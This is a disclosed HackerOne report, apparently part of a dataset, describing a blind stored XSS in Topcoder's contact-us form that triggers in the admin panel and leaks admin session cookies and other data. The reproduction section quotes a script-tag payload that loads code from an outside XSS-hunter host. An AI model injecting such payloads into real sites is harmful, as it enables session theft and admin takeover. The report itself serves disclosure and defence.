---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '878145'
original_report_id: '878145'
title: Blind stored XSS due to insecure contact form at https://www.topcoder.com leads
  to leakage of session token and other PII
weakness: Cross-site Scripting (XSS) - Stored
team_handle: topcoder
created_at: '2020-05-19T15:40:22.675Z'
disclosed_at: '2020-08-07T17:17:07.746Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 15
asset_identifier: www.topcoder.com
asset_type: URL
max_severity: critical
tags:
- hackerone
- cross-site-scripting-xss-stored
---

# Blind stored XSS due to insecure contact form at https://www.topcoder.com leads to leakage of session token and other PII

## Metadata

- HackerOne Report ID: 878145
- Weakness: Cross-site Scripting (XSS) - Stored
- Program: topcoder
- Disclosed At: 2020-08-07T17:17:07.746Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

## Summary:
I have discovered a blind stored cross site scripting vulnerability due to an insecure Contact form available here https://www.topcoder.com/contact-us/ This form does not properly sanitize user input allowing for the insertion and submission of dangerous characters such as angle brackets.  I was able to submit a blind xss payload through the form which was triggered in backend /admin panel.

## Steps To Reproduce:
[add details for how we can reproduce the issue]

1.	Browse to the page at https://www.topcoder.com/contact-us/ and fill out the contact form submitting your blind XSS payload in First name , Last name, Company and description field. 
2.	Submit the form and have and admin access the information.
3.	This will trigger XSS in the admin panel and a notification to the XSS hunter service with details of the event. 

## Supporting Material/References:
[list any additional material (e.g. screenshots, logs, etc.)]

  * [attachment / reference]

F834746  XSS hunter screenshot revealing mail chimp information

█████ Dom.html you can search through this for my XSS hunter payload `"><script src=https://xvt.xss.ht></script>`

F834748 Full XSS hunter email report

## Impact

An attacker is able to access critical information from the admin panel. The XSS reveals the administrator’s IP address, backend application service, titles of mail chimp customer and internal subscription emails, admin session cookies.
An attacker can exploit the above cookies to access the admin panel.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
